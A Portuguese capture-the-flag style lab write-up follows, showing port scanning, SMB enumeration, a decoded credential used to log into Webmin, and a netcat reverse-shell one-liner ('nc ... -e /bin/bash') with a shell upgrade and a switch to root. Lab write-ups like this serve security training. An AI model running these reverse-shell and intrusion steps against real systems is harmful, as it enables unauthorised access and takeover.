* [Recon-Enumeration](#recon-enumeration)
* [Exploit](#exploit)
* [Privesc](#privesc)
* [Discoveries](#discoveries)

## Recon-Enumeration  
└─$ sudo masscan -p 1-65535 --rate=10000 -i tun0 192.168.94.238
![](Pasted%20image%2020230127233253.png)

└─$ sudo nmap -sCV -p 139,10000,445,80,20000 -v -Pn 192.168.94.238  
![](Pasted%20image%2020230127233414.png)

Acessando a porta 80
![](Pasted%20image%2020230127214521.png)

Analisando o código fonte da página conseguimos encontrar alguma mensagem criptografada
![](Pasted%20image%2020230127214608.png)

Para descriptografia eu gosto de utilizar a página dcode.fr
https://www.dcode.fr/cipher-identifier
![](Pasted%20image%2020230127214733.png)

Interpretando a mensagem chegamos no seguinte resultado ---> .2uqPEfj3D<P'a-3
![](Pasted%20image%2020230127215055.png)

Voltando, vamos acessar a porta 10000
![](Pasted%20image%2020230127215205.png)

![](Pasted%20image%2020230127215235.png)

Voltando, vamos acessar a porta 20000
![](Pasted%20image%2020230127233446.png)

Enumerando SMB
└─$ enum4linux 192.168.94.238
![](Pasted%20image%2020230127220503.png)

![](Pasted%20image%2020230127220529.png)

![](Pasted%20image%2020230127221523.png)

Talvez tenhamos conseguido uma credencial
cyber:.2uqPEfj3D<P'a-3

Testando no Webmin da porta 10000 não surtiu efeito, porém no da porta 20000 nós conseguimos acessar
![](Pasted%20image%2020230127233558.png)


## Exploit
![](Pasted%20image%2020230128002824.png)

![](Pasted%20image%2020230128003120.png)

![](Pasted%20image%2020230128003212.png)

![](Pasted%20image%2020230128003932.png)

![](Pasted%20image%2020230128003916.png)
 Ts&4&YurgtRX(=~h

nc 192.168.xx.xx 443 -e /bin/bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
su root
![](Pasted%20image%2020230128004610.png)

## Privesc  


## Discoveries
